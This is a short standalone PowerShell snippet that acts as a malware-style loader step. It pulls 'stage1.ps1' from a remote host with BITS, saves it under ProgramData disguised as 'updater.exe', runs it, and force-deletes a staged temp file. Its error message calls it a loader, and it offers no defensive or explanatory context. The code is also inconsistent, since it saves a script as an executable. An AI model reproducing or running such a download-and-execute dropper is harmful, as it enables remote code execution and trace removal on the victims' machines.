
try { $RemoteUrl = 'https://internal.corp:443/stage1.ps1'; $OutputPath = 'C:\ProgramData\updater.exe'; Start-BitsTransfer -Source $RemoteUrl -Destination $OutputPath; Start-Process -FilePath $OutputPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force } catch { Write-Warning "Loader step failed" }
